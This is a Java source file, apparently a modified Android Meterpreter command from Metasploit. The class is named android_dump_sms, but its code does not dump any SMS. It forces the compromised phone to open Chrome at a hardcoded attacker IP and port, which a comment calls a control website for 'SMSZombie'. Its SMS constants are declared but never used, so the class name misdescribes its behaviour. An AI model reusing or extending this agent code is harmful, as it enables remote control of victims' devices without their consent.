package com.metasploit.meterpreter.android;

import android.database.Cursor;
import android.net.Uri;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.app.Activity;
import android.content.Context;
import android.net.Uri;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;

public class android_dump_sms implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_SMS_ADDRESS = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9001);
    private static final int TLV_TYPE_SMS_BODY = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9002);
    private static final int TLV_TYPE_SMS_TYPE = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9003);
    private static final int TLV_TYPE_SMS_GROUP = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9004);
    private static final int TLV_TYPE_SMS_STATUS = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9005);
    private static final int TLV_TYPE_SMS_DATE = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9006);


    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {


        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
        final Context context = androidMeterpreter.getContext();



       /* Android Q poses limitations on starting activities
        *
        * https://developer.android.com/guide/components/activities/background-starts
        */

        // Starts intent with deeplink to navigate SMSZombie's WebView to control website
        try {
        String url = "http://192.168.1.134:1312";
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setData(Uri.parse(url));
        intent.setPackage("com.android.chrome");
        context.startActivity(intent);

        } catch (ActivityNotFoundException e) {
          return ERROR_FAILURE;
        }

        return ERROR_SUCCESS;
    }

}
